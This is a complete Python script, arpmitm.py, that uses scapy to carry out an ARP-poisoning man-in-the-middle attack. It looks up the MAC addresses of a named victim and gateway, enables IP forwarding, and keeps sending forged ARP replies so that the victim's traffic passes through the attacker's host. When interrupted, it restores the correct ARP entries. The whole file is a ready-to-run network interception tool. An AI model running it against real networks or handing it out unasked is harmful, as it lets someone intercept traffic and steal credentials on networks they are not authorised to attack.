#!/usr/bin/python

# arpmitm.py

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

import os
import sys
import time

if len(sys.argv) != 4:
    print("usage: arpmitm.py <interface> <gateway_ip> <victim_ip>")
    sys.exit(1)


interface = sys.argv[1]
gateway_addr = sys.argv[2]
victim_addr = sys.argv[3]
bcast = "ff:ff:ff:ff:ff:ff"


def getmac(addr):
    conf.verb = 0
    a,u = srp(Ether(dst=bcast)/ARP(pdst=addr), 
              timeout=2, iface=interface, inter=0.1)
    for s,r in a:
        return r.sprintf(r"%Ether.src%")

def poison(g,v):
    send(ARP(op=2, pdst=victim_addr, psrc=gateway_addr, hwdst=v))
    send(ARP(op=2, pdst=gateway_addr, psrc=victim_addr, hwdst=g))


def antidote(g,v):
    send(ARP(op=2, pdst=gateway_addr, psrc=victim_addr, 
             hwdst=bcast, hwsrc=v), count=9)
    send(ARP(op=2, pdst=victim_addr, psrc=gateway_addr, 
             hwdst=bcast, hwsrc=g), count=9)


def mitm():
    victimmac = getmac(victim_addr)
    gatewaymac = getmac(gateway_addr)

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while True:
        try:
            poison(gatewaymac,victimmac)
            time.sleep(1.5)

        except KeyboardInterrupt:
            antidote(gatewaymac,victimmac)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("\n")
            break


mitm()        
